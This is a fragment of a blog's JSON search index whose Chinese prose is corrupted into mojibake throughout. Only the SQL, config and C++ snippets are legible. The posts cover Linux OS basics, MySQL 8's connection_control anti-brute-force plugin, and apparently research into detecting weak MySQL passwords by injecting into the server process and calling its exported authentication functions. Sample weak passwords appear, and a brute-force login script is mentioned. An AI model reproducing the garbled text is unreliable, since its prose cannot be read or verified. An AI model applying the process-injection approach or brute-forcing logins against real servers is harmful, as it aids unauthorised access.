åˆ†æ—¶æ“ä½œç³»ç»Ÿï¼šç›®å‰å¤§éƒ¨åˆ†æ¡Œé¢æ“ä½œç³»ç»Ÿéƒ½å±äºåˆ†æ—¶æ“ä½œç³»ç»Ÿï¼Œå…¶ä¸­æœ€ä¸»è¦çš„åŒºåˆ«å°±æ˜¯å¤šä»»åŠ¡åˆ†æ—¶å…±äº«è®¡ç®—æœºçš„å¤„ç†èµ„æºã€‚ç›®å‰æ‰€è§åˆ°çš„ Windowsã€Ubuntuã€MacOS ç­‰æ¡Œé¢æ“ä½œç³»ç»Ÿéƒ½å±äºåˆ†æ—¶æ“ä½œç³»ç»Ÿã€‚ å®æ—¶æ“ä½œç³»ç»Ÿï¼šå®æ—¶æ“ä½œç³»ç»Ÿé’ˆå¯¹å·¥ä¸šå’Œéœ€è¦åŠæ—¶å¤„ç†æ•°æ®æ¶ˆæ¯è€Œè®¾è®¡çš„æ“ä½œç³»ç»Ÿï¼Œæœ‰åŠæ—¶æ€§ã€å¯é æ€§ç­‰ç‰¹ç‚¹ã€‚è¿™ç±»å‹æ“ä½œç³»ç»Ÿå¤šæŒ‡åµŒå…¥å¼æ“ä½œç³»ç»Ÿï¼Œæœ‰ rtosã€uCosII ç­‰ç­‰ã€‚ 0x04 æ“ä½œç³»ç»Ÿçš„ç»“æ„ç»„æˆ æ“ä½œç³»ç»Ÿæ˜¯ä¸€ä¸ªå¤§å‹çš„è½¯ä»¶ç³»ç»Ÿï¼Œæ˜¯ç”±è®¸å¤šç‹¬ç«‹åŠŸèƒ½çš„ç¨‹åºæ¨¡å—ç»„æˆçš„ï¼Œè¿™äº›ç¨‹åºæ¨¡å—å…±åŒæ„æˆäº†ä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿã€‚å¤§éƒ¨åˆ†çš„æ“ä½œç³»ç»Ÿéƒ½å¯ä»¥è¢«åˆ†ä¸ºè¿™æ ·ä¸¤ç§ç»“æ„ï¼šå±‚æ¬¡ç»“æ„å’Œå¾®å†…æ ¸ç»“æ„ã€‚ å±‚æ¬¡ç»“æ„ å±‚æ¬¡ç»“æ„æ“ä½œç³»ç»Ÿçš„è®¾è®¡æ€æƒ³ä¸»è¦æ˜¯æŒ‰ç…§æ“ä½œç³»ç»Ÿå„ä¸ªæ¨¡å—çš„åŠŸèƒ½å’Œç›¸äº’ä¹‹é—´çš„ä¾å­˜å…³ç³»è€Œè®¾è®¡ã€‚è€Œæ“ä½œç³»ç»Ÿåº”è¯¥åˆ†ä¸ºå¤šå°‘å±‚ï¼Œå„ä¸ªå±‚åº”è¯¥åœ¨ä»€ä¹ˆä½ç½®å…¶å®éƒ½æ˜¯å±‚æ¬¡ç»“æ„æ“ä½œç³»ç»Ÿçš„è®¾è®¡å…³é”®ç‚¹ã€‚å¤„äºæœ€åº•å±‚çš„ç¨‹åºæ¨¡å—å¾€å¾€æˆä¸ºæ“ä½œç³»ç»Ÿçš„å†…æ ¸ã€‚è¿™éƒ¨åˆ†ç¨‹åºæ¨¡å—çš„åŠŸèƒ½åŒ…æ‹¬ç³»ç»Ÿä¸­æ–­å¤„ç†ç¨‹åºã€å„ä¸ªå¤–è®¾é©±åŠ¨ç¨‹åºã€é«˜ä¼˜å…ˆçº§å¤„ç†é¢‘ç‡é«˜çš„ç¨‹åºæ¨¡å—ï¼ˆå¦‚æ—¶é’Ÿç®¡ç†ç¨‹åºã€è¿›ç¨‹è°ƒåº¦ç¨‹åºã€ä½çº§é€šä¿¡æ¨¡å—ã€å†…å­˜ç®¡ç†æ¨¡å—ç­‰ç­‰ï¼‰ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸ºäº†æ•´ä¸ªæ“ä½œç³»ç»Ÿçš„æ•ˆç‡ï¼Œç³»ç»Ÿå†…æ ¸éƒ¨åˆ†ä¼šåœ¨è®¡ç®—æœºç³»ç»Ÿå·¥ä½œè¿‡ç¨‹ä¸­å¸¸é©»å†…å­˜ä¸­æŒç»­è¿è¡Œã€‚ å¾®å†…æ ¸ç»“æ„ ä¸å±‚æ¬¡ç»“æ„ç›¸å¯¹çš„å°±æ˜¯å¾®å†…æ ¸ç»“æ„ã€‚å¾®å†…æ ¸ç»“æ„çš„æ“ä½œç³»ç»Ÿå…¶å®å°±æ˜¯æŠŠæ“ä½œç³»ç»Ÿä¸­çš„åŸºæœ¬åŠŸèƒ½æ¨¡å—ç»„ç»‡ä¸ºæ“ä½œç³»ç»Ÿçš„å¾®å†…æ ¸ï¼Œè€Œå…¶ä»–åŠŸèƒ½æ¨¡å—å°½é‡åšåˆ°å†…æ ¸ä»¥å¤–ï¼Œé€šè¿‡è°ƒç”¨å†…æ ¸æ¥å®ç°ã€‚å¾®å†…æ ¸æœºæ„æ˜¯å…·æœ‰å¦‚ä¸‹ä¼˜ç‚¹ï¼š ç®€åŒ–å†…æ ¸ä»£ç ç»´æŠ¤å·¥ä½œï¼šå¾®å†…æ ¸ä»£ç é‡å°‘ï¼Œç»“æ„ç®€å•æ˜“äºç»´æŠ¤ã€‚å½“éœ€è¦å¢åŠ æ“ä½œç³»ç»ŸåŠŸèƒ½æ—¶ï¼Œé€šå¸¸æƒ…å†µä¸‹ä»…éœ€è¦åœ¨å†…æ ¸ä»¥å¤–è¿›è¡Œå³å¯ï¼› å»ºæ„çµæ´»ï¼šåœ¨å¾®å†…æ ¸ä¸Šå¯ä»¥å¼€å‘å®ç°å¤šç§ç±»å‹çš„æ“ä½œç³»ç»Ÿã€‚ä¾‹å¦‚ï¼šåœ¨å¾®å†…æ ¸ç»“æ„ä¸Šæä¾›ä¸€ç»„ Unix æœåŠ¡ç¨‹åºï¼Œé‚£ä¹ˆæ“ä½œç³»ç»Ÿå¯¹äºç”¨æˆ·æ¥è¯´å°±æ˜¯ Unix ç³»ç»Ÿï¼Œè€Œæä¾›ä¸€ç»„ Windows æœåŠ¡ç¨‹åºåˆ™å°±åƒæ˜¯ Windows ç³»ç»Ÿä¸€æ ·ã€‚ å®‰å…¨æ€§é«˜ï¼šç”±äºå¤§éƒ¨åˆ†çš„åŠŸèƒ½æ¨¡å—éƒ½æ˜¯å¤„äºå†…æ ¸ä»¥å¤–çš„éƒ¨åˆ†è¿è¡Œå®ç°ï¼Œå…¶å®ç±»ä¼¼é«˜çº§ç”¨æˆ·ä¸€æ ·çš„å±‚æ¬¡ï¼Œåˆ™ç›¸å¯¹äºæ“ä½œç³»ç»Ÿæ¥è¯´æ›´å®‰å…¨ï¼Œå¤§éƒ¨åˆ†åŠŸèƒ½æ¨¡å—äº§ç”Ÿçš„æ¼æ´ä¸ä¼šå½±å“åˆ°ç³»ç»Ÿå†…æ ¸éƒ¨åˆ†ã€‚ æ–¹ä¾¿ç§»æ¤ï¼šç”±äºç¡¬ä»¶ç›¸å…³çš„éƒ¨åˆ†éƒ½åŒ…å«åœ¨å¾®å†…æ ¸ä¸­ï¼Œå½“éœ€è¦è¿›è¡Œç³»ç»Ÿç§»æ¤æ—¶ï¼Œåªéœ€è¦ä¿®æ”¹å¾®å†…æ ¸ä»£ç ä»¥é€‚åº”ä¸åŒçš„ç¡¬ä»¶å¹³å°å³å¯è¿›è¡Œç³»ç»Ÿç§»æ¤ï¼Œè€Œå¯¹äºæ“ä½œç³»ç»Ÿä¸­å„ä¸ªåŠŸèƒ½æ¨¡å—ä»¥åŠæ›´ä¸Šå±‚çš„åº”ç”¨å±‚æ¥è¯´ä¸éœ€è¦åšä»»ä½•æ”¹å˜ã€‚ Linux æ“ä½œç³»ç»Ÿä»‹ç» ç»è¿‡å¯¹æ“ä½œç³»ç»Ÿçš„ä»‹ç»ï¼Œè¯¦ç»†å¤§å®¶å¯¹äºè®¡ç®—æœºç³»ç»Ÿä¸­çš„æ“ä½œç³»ç»Ÿåº”è¯¥æœ‰äº†ä¸€å®šçš„æ¦‚å¿µã€‚æœ¬è¯¾ç¨‹é‡ç‚¹ç ”ç©¶çš„æ“ä½œç³»ç»Ÿæ˜¯ Linux æ“ä½œç³»ç»Ÿï¼Œç°åœ¨å°±ç®€å•ä»‹ç»ä¸€ä¸‹å…³äº Linux æ“ä½œç³»ç»Ÿã€‚å‰é¢å®ç°ç»ƒä¹ æ“ä½œçš„ Ubuntu æ¡Œé¢æ“ä½œç³»ç»Ÿå°±æ˜¯ä¸€ä¸ªåŸºäº Linux å†…æ ¸å®ç°çš„ Linux æ¡Œé¢æ“ä½œç³»ç»Ÿã€‚ Linux ç³»ç»Ÿæœ‰ä¸¤ç§ä¸åŒçš„å«ä¹‰ï¼š ä¸€æ–¹é¢å•æŒ‡ Linus Torvalds ç»´æŠ¤çš„å¼€æºä»£ç  Unix ç±»æ“ä½œç³»ç»Ÿçš„å†…æ ¸ Linuxï¼› å¦ä¸€æ–¹é¢æŒ‡çš„æ˜¯ä»¥ Linux å†…æ ¸ä¸ºåŸºç¡€çš„æ•´ä¸ªæ“ä½œç³»ç»Ÿï¼Œæ‰€ä»¥è¿™ç§æ–¹å¼è¡¨ç¤ºçš„ Linux æŒ‡çš„æ˜¯åŒ…å«å†…æ ¸ã€ç³»ç»Ÿå·¥å…·ã€å®Œæ•´çš„å¼€å‘ç¯å¢ƒå’Œåº”ç”¨çš„ç±» Unix æ“ä½œç³»ç»Ÿï¼› Linux ç°åœ¨æ˜¯ä¸ªäººè®¡ç®—æœºå’Œå·¥ä½œç«™ä¸Šçš„ Unix ç±»æ“ä½œç³»ç»Ÿã€‚æŒ‰ç…§å±‚æ¬¡ç»“æ„çš„è§‚ç‚¹ï¼Œåœ¨åŒä¸€ç§ç¡¬ä»¶å¹³å°ä¸Šï¼ŒLinux å¯ä»¥æä¾›å’Œ Unix ç›¸åŒçš„æœåŠ¡ï¼Œå³ç›¸åŒçš„ç”¨æˆ·çº§å’Œç¨‹åºå‘˜çº§æ¥å£ã€‚Linux ç»ä¸æ˜¯ç®€åŒ–ç‰ˆçš„ Unixï¼Œç›¸åï¼ŒLinux æ˜¯å¼ºæœ‰åŠ›å’Œå…·æœ‰åˆ›æ–°æ„ä¹‰çš„ Unix æ“ä½œç³»ç»Ÿï¼Œä¸ä»…ç»§æ‰¿äº† Unix çš„ç‰¹å¾ï¼Œè€Œä¸”åœ¨è®¸å¤šæ–¹é¢è¶…è¿‡äº† Unix ã€‚ä½œä¸º Unix ç±»æ“ä½œç³»ç»Ÿï¼ŒLinux æ“ä½œç³»ç»Ÿå…·æœ‰å¦‚ä¸‹åŸºæœ¬ç‰¹å¾ï¼š æ˜¯çœŸæ­£çš„å¤šç”¨æˆ·ã€å¤šä»»åŠ¡æ“ä½œç³»ç»Ÿ ç¬¦åˆ POSIX æ ‡å‡†çš„æ“ä½œç³»ç»Ÿ æä¾›å…·æœ‰å†…ç½®å®‰å…¨æªæ–½çš„åˆ†å±‚çš„æ–‡ä»¶ç³»ç»Ÿ æä¾› shell å‘½ä»¤è§£é‡Šç¨‹åºå’Œç¼–ç¨‹è¯­è¨€ æä¾›å¼ºå¤§çš„ç®¡ç†åŠŸèƒ½ï¼ŒåŒ…æ‹¬è¿œç¨‹ç®¡ç†åŠŸèƒ½ å…·æœ‰å†…æ ¸çš„ç¼–ç¨‹æ¥å£ å…·æœ‰å›¾å½¢ç”¨æˆ·æ¥å£ å…·æœ‰å¤§é‡æœ‰ç”¨çš„å®ç”¨ç¨‹åºå’Œé€šä¿¡ã€è”ç½‘å·¥å…· å…·æœ‰é¢å‘å±å¹•çš„ç¼–è¾‘è½¯ä»¶ Linuxçš„å†…æ ¸ç‰¹å¾ Linux æ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒç¨³å®šè€Œä¸”é«˜æ•ˆï¼Œä»¥ç‹¬å çš„æ–¹å¼æ‰§è¡Œæœ€åº•å±‚ä»»åŠ¡ï¼Œä¿è¯å…¶ä»–ç¨‹åºçš„æ­£å¸¸è¿è¡Œæ˜¯æ•´ä¸ªç³»ç»Ÿçš„æ ¸å¿ƒå’Œç‹¬ç‰¹çš„æ€§è´¨ã€‚ 1ã€æ¥å£ç‰¹è‰² æŒ‰ç…§ POSIX æ ‡å‡†ï¼Œå¯ä»¥è¿è¡Œ Unix ç¨‹åºçš„ç³»ç»Ÿå°±æ˜¯ Unixï¼Œä½¿ç”¨ Linux ç³»ç»Ÿä¹Ÿå±äº Unix çš„ä¸€ç§ã€‚ä¸ºæ­¤ï¼ŒLinux ç³»ç»Ÿæä¾›äº†å’Œä¸€èˆ¬ Unix ç³»ç»Ÿç›¸åŒçš„æ ‡å‡†ç•Œé¢ï¼ŒåŒ…æ‹¬ç¨‹åºçº§å’Œç”¨æˆ·çº§çš„ã€‚ 2ã€åŠŸèƒ½ç‰¹è‰² Linux æ ¸å¿ƒæœ€æ—©è¿è¡Œåœ¨ Intel 80386 ç³»ç»Ÿ PC æœºä¸Šï¼Œå¦‚ä»Šï¼ŒLinux å·²ç»èƒ½å¤Ÿæ­£å¸¸è¿è¡Œåœ¨ Appleã€DEC alphaã€MIPSã€Motorola ç­‰ç­‰ä¸€ç³»åˆ—è®¡ç®—æœºä¸Šã€‚åŒæ—¶ï¼Œä¸€äº›æ”¹è¿›çš„åµŒå…¥å¼ Linux æ ¸å¿ƒä¹Ÿå¯ä»¥è¿è¡Œåœ¨æ‰‹æœºã€å®¶ç”µç­‰è®¾å¤‡ä¸Šã€‚Linux ç³»ç»Ÿæ”¯å‡ºå¤šç§ç¡¬ä»¶è®¾å¤‡ï¼Œå¹¶ä¸”ç”±äº Linux ç³»ç»Ÿä¸‹çš„é©±åŠ¨ç¨‹åºçš„å¼€å‘æ–¹å¼ç›¸æ¯” Windows ç­‰å…¶ä»–æ“ä½œç³»ç»Ÿæ›´ä¸ºç®€å•ï¼Œæ‰€ä»¥è¶Šæ¥è¶Šå¤šçš„ç¡¬ä»¶å‚å•†ä¹Ÿé’ˆå¯¹ Linux æ“ä½œç³»ç»Ÿæä¾›è®¾å¤‡é©±åŠ¨ã€‚æ­¤å¤–ï¼ŒLinux çš„å†…å­˜ç®¡ç†é‡‡ç”¨å¤šçº§åˆ†é¡µçš„æ–¹å¼ï¼›ä½¿ç”¨ä¸“ç”¨æ–‡ä»¶ç³»ç»Ÿ Ext2 å¯ä»¥æä¾›æ–¹ä¾¿æœ‰æ•ˆçš„æ–‡ä»¶å…±äº«åŠä¿æŠ¤æœºåˆ¶ï¼›å†…ç½® TCP/IP åè®®æ ˆä¹Ÿæä¾›äº†å„ç§é«˜æ•ˆçš„ç½‘ç»œåŠŸèƒ½ï¼ŒåŒ…æ‹¬åŸºæœ¬çš„è¿›ç¨‹é—´é€šä¿¡ã€ç½‘ç»œæ–‡ä»¶æœåŠ¡ç­‰ç­‰ã€‚ Linuxçš„ç‰ˆæœ¬æŸ¥çœ‹ Linux å†…æ ¸é‡‡ç”¨çš„æ˜¯åŒæ ‘ç³»ç»Ÿï¼Œä¸€æ£µæ ‘æ˜¯ç¨³å®šæ ‘ï¼Œä¸»è¦ç”¨äºå‘è¡Œï¼›å¦ä¸€æ£µæ ‘æ˜¯éç¨³å®šæ ‘æˆ–è€…å¼€å‘æ ‘ï¼Œç”¨äºäº§å“å¼€å‘ã€æ”¹è¿›ã€‚Linux ç‰ˆæœ¬åºå·çš„å½¢å¼ä¸º x.y.z ï¼Œå¯¹äºç¨³å®šæ ‘æ¥è¯´ï¼Œy æ˜¯å¶æ•°ï¼›è€Œå¯¹äºå¼€å‘æ ‘æ‹‰è¯´ï¼Œy æ˜¯ç›¸æ¯”ç¨³å®šæ ‘å¤§ä¸€çš„å¥‡æ•°ã€‚ æˆ‘ä»¬å¯ä»¥åœ¨ Linux æ“ä½œç³»ç»Ÿçš„ç»ˆç«¯çª—å£ä¸‹é€šè¿‡å‘½ä»¤æ¥è·å–å½“å‰æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬å·ï¼Œå…·ä½“å¦‚ä¸‹ï¼š 1uname -a ç»“æœæ˜¾ç¤ºå¦‚ä¸‹ï¼š","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"ä¹¦ç±","slug":"ä¹¦ç±","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D/"},{"name":"ä¹¦ç±/ã€ŠLinuxæ“ä½œç³»ç»ŸåŸç†å‰–æã€‹","slug":"ä¹¦ç±-ã€ŠLinuxæ“ä½œç³»ç»ŸåŸç†å‰–æã€‹","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D-%E3%80%8ALinux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90%E3%80%8B/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","slug":"A-OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"ã€å¼±å¯†ç ã€‘MySQL8-Connection_control-plugin","date":"2023-12-10T16:00:00.000Z","path":"wiki/MySQL8/ã€å¼±å¯†ç ã€‘MySQL8-Connection_control-plugin/","text":"æ¦‚è¿°ï¼šMySQL çš„è¿æ¥æ§åˆ¶æ’ä»¶çš„ä½¿ç”¨ä¸ç›¸å…³é…ç½®è®¾ç½®(windows)ã€‚å‚è€ƒæ–‡æ¡£è§æ–‡æœ«ã€‚ ç›¸å…³æ–‡ç« ï¼š ã€å¼±å¯†ç ã€‘MySQL8-plugin å®‰è£…æ’ä»¶ 1234INSTALL PLUGIN CONNECTION_CONTROL SONAME &#x27;connection_control.so&#x27;;INSTALL PLUGIN CONNECTION_CONTROL_FAILED_LOGIN_ATTEMPTS SONAME &#x27;connection_control.so&#x27;; ä¿®æ”¹é…ç½®æ–‡ä»¶ 12[mysqld]plugin-load-add=connection_control.so æŸ¥çœ‹è¿æ¥é…ç½® 123456789show variables like &#x27;connection_control%&#x27;;+-------------------------------------------------+------------+| Variable_name | Value |+-------------------------------------------------+------------+| connection_control_failed_connections_threshold | 3 || connection_control_max_connection_delay | 2147483647 || connection_control_min_connection_delay | 1000 |+-------------------------------------------------+------------+ ä¿®æ”¹å¯åŠ¨é…ç½®æ–‡ä»¶ å¦‚æœå·²ç»å®‰è£…æ³¨å†Œäº†æ’ä»¶ï¼Œä¸ºé¿å…æ¯æ¬¡å¯åŠ¨éƒ½éœ€è¦è®¾ç½®å‚æ•°ï¼Œå¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­æ·»åŠ ç›¸å…³é…ç½®é¡¹ã€‚ 1234[mysqld]plugin-load-add=connection_control.soconnection-control=FORCE_PLUS_PERMANENTconnection-control-failed-login-attempts=FORCE_PLUS_PERMANENT è®¾ç½®è¿æ¥å°è¯•æ¬¡æ•° 12345CREATE USER &#x27;u1&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;password&#x27; FAILED_LOGIN_ATTEMPTS 3 PASSWORD_LOCK_TIME 3;ALTER USER &#x27;u2&#x27;@&#x27;localhost&#x27; FAILED_LOGIN_ATTEMPTS 4 PASSWORD_LOCK_TIME UNBOUNDED; ç™»å½•æ—¶å€™åå°±ä¼šæœ‰å¦‚ä¸‹æç¤ºï¼ˆé‡å¯mysqlæœåŠ¡å¯è§£é™¤é”å®šï¼‰,ç›®å‰å·²çŸ¥çš„æ˜¯è™½ç„¶ mysql å‘½ä»¤è¡Œç™»å½• å’Œ mysql::mysql_real_connect ä½¿ç”¨çš„æ˜¯ä¸åŒæ¥å£ï¼Œä½†æ˜¯è§¦å‘ç­–ç•¥æœ€ç»ˆçš„æ¥å£æ˜¯åŒä¸€ä¸ªï¼Œéƒ½ä¼šè§¦å‘é˜²çˆ†ç ´ç­–ç•¥ã€‚ 123C:\\mysql-8.1.0-winx64\\bin&gt;mysql -ucspweak2 -padmin123mysql: [Warning] Using a password on the command line interface can be insecure.ERROR 3955 (HY000): Access denied for user &#x27;cspweak2&#x27;@&#x27;localhost&#x27;. Account is blocked for 3 day(s) (3 day(s) remaining) due to 3 consecutive failed logins. è¡¥å……ä¸€ä¸ªæš´åŠ›ç™»å½•çš„è„šæœ¬ ã€æ‰¹å¤„ç†ã€‘MySQL ç™»å½• æŸ¥çœ‹ç™»å½•å¤±è´¥çš„ç”¨æˆ· 1234567mysql&gt; select * from INFORMATION_SCHEMA.CONNECTION_CONTROL_FAILED_LOGIN_ATTEMPTS;+--------------------+-----------------+| USERHOST | FAILED_ATTEMPTS |+--------------------+-----------------+| &#x27;root&#x27;@&#x27;localhost&#x27; | 9 |+--------------------+-----------------+1 row in set (0.00 sec) å…¶ä»–è¡¥å…… ç”¨æˆ·è¡¨å­—æ®µ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455+--------------------------+-----------------------------------+------+-----+-----------------------+-------+| Field | Type | Null | Key | Default | Extra |+--------------------------+-----------------------------------+------+-----+-----------------------+-------+| Host | char(255) | NO | PRI | | || User | char(32) | NO | PRI | | || Select_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Insert_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Update_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Delete_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Create_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Drop_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Reload_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Shutdown_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Process_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || File_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Grant_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || References_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Index_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Alter_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Show_db_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Super_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Create_tmp_table_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Lock_tables_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Execute_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Repl_slave_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Repl_client_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Create_view_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Show_view_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Create_routine_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Alter_routine_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Create_user_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Event_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Trigger_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Create_tablespace_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || ssl_type | enum(&#x27;&#x27;,&#x27;ANY&#x27;,&#x27;X509&#x27;,&#x27;SPECIFIED&#x27;) | NO | | | || ssl_cipher | blob | NO | | NULL | || x509_issuer | blob | NO | | NULL | || x509_subject | blob | NO | | NULL | || max_questions | int unsigned | NO | | 0 | || max_updates | int unsigned | NO | | 0 | || max_connections | int unsigned | NO | | 0 | || max_user_connections | int unsigned | NO | | 0 | || plugin | char(64) | NO | | caching_sha2_password | || authentication_string | text | YES | | NULL | || password_expired | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || password_last_changed | timestamp | YES | | NULL | || password_lifetime | smallint unsigned | YES | | NULL | || account_locked | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Create_role_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Drop_role_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Password_reuse_history | smallint unsigned | YES | | NULL | || Password_reuse_time | smallint unsigned | YES | | NULL | || Password_require_current | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | YES | | NULL | || User_attributes | json | YES | | NULL | |+--------------------------+-----------------------------------+------+-----+-----------------------+-------+","tags":[{"name":"æ•°æ®åº“/MySQL","slug":"æ•°æ®åº“-MySQL","permalink":"https://hodlyounger.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93-MySQL/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"MySQL8","slug":"wiki/MySQL8","permalink":"https://hodlyounger.github.io/categories/wiki/MySQL8/"}]},{"title":"ã€å¼±å¯†ç ã€‘MySQL8 å®‰è£…åŠæ’ä»¶å¯¼å‡º","date":"2023-12-10T16:00:00.000Z","path":"wiki/MySQL8/ã€å¼±å¯†ç ã€‘MySQL8-å®‰è£…åŠæ’ä»¶æœºåˆ¶/","text":"æ¦‚è¿°ï¼šMySQL 8 å¼±å¯†ç é¢„ç ”è¯´æ˜ï¼Œæ ¹æ®ç›®å‰çš„è°ƒç ”ç»“æœï¼Œæš‚æ—¶åªèƒ½é€šè¿‡æ³¨å…¥å¹¶è°ƒç”¨çš„æ–¹å¼æ¥æ£€æµ‹ï¼Œä¸”è¿™ç§æ–¹å¼ä¼šè§¦å‘ MySQL é˜²çˆ†ç ´ç­–ç•¥ã€‚ mysql è®¤è¯ç›¸å…³æ¥å£å‡ä»¥æ’ä»¶å½¢å¼ï¼Œå…¨å±€å¯¼å‡ºäº†æ’ä»¶çš„åˆ—è¡¨ 1Cached_authentication_plugins * g_cached_authentication_plugins 0000000147BB31D0 13573 mysql 8.0.34 ç‰ˆæœ¬åŠä¹‹åå…±æœ‰ä¸‰ä¸ªæ’ä»¶ï¼š sha256_password mysql_native_password caching_sha2_password å¯ä»¥è·å–åˆ°è¿™ä¸‰ä¸ªæ’ä»¶ï¼Œä½†æ˜¯ mysql çš„å®‰å…¨æœºåˆ¶ä¸Šï¼Œæ²¡æœ‰åŠæ³•è°ƒç”¨æ’ä»¶å¯¹åº”çš„å‡½æ•°æ¥å£ã€‚åœ¨æ¯ä¸ªæ’ä»¶å‡½æ•°æ¥å£çš„å†…éƒ¨éƒ½æ˜¯é€šè¿‡ THD çš„å˜é‡ä¼ é€’ç™»å½•ä¿¡æ¯å’Œç™»å½•ç»“æœçš„ã€‚ 1234THD *thd = current_thd;if (!thd-&gt;m_disable_password_validation) &#123; if (my_validate_password_policy(inbuf, inbuflen)) return 1;&#125; æ’ä»¶å¯¼å‡ºæ¥å£çš„è¯¦ç»†è¯´æ˜å¯æŸ¥çœ‹è¿™ç¯‡æ–‡ç«  ã€å¼±å¯†ç ã€‘MySQL8-å¯†ç Function å®‰è£…åŠå¯åŠ¨ è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œpathæ·»åŠ  mysql\\bin ç›®å½• mysqld install mysqld -â€“initilalize â€“-console net start mysql ç™»å½•åä¿®æ”¹å¯†ç  alter user root@localhost identified by 'Admin@123'; åˆ›å»ºä¸åŒæ’ä»¶çš„ç”¨æˆ· create USER mnpweak2 IDENTIFIED WITH mysql_native_password BY 'admin123'; ç›¸å…³å¯¼å‡ºæ¥å£ å£°æ˜ 1234567891011121314151617181920typedef MYSQL * (__stdcall *pfn_mysql_init)(MYSQL *mysql);typedef int(__stdcall *pfn_mysql_options)(MYSQL *mysql, enum mysql_option option, const void *arg);typedef MYSQL * (__stdcall *pfn_mysql_real_connect)(MYSQL *mysql, const char *host, const char *user, const char *passwd, const char *db, unsigned int port, const char *unix_socket, unsigned long clientflag);typedef int(__stdcall *pfn_mysql_query)(MYSQL *mysql, const char *q);typedef int(__stdcall *pfn_mysql_real_query)(MYSQL *mysql, const char *q, unsigned long length);typedef MYSQL_RES * (__stdcall *pfn_mysql_store_result)(MYSQL *mysql);typedef unsigned int(__stdcall *pfn_mysql_num_fields)(MYSQL_RES *mysql);typedef MYSQL_FIELD * (__stdcall *pfn_mysql_fetch_field)(MYSQL_RES *mysql);typedef MYSQL_ROW(__stdcall *pfn_mysql_fetch_row)(MYSQL_RES *mysql);typedef const char * (__stdcall *pfn_mysql_error)(MYSQL *mysql);typedef void(__stdcall *pfn_mysql_close)(MYSQL *sock);typedef std::pair&lt;bool, bool&gt;(__stdcall *fastAuthenticate)(const std::string &amp;authorization_id, const unsigned char *random, unsigned int random_length, const unsigned char *scramble, bool check_second); // æ­¤å¤–è¿˜å¯¼å‡ºäº†ä¸¤ä¸ªæ’ä»¶ st_mysql_plugin *m_builtin_caching_sha2_password_plugin = NULL; st_mysql_plugin *m_builtin_mysql_password_plugin = NULL; è·å– 1234567891011121314m_ptr_mysql_init = (pfn_mysql_init)GetProcAddress(hExe, &quot;mysql_init&quot;);m_ptr_mysql_options = (pfn_mysql_options)GetProcAddress(hExe, &quot;mysql_options&quot;);m_ptr_mysql_real_connect = (pfn_mysql_real_connect)GetProcAddress(hExe, 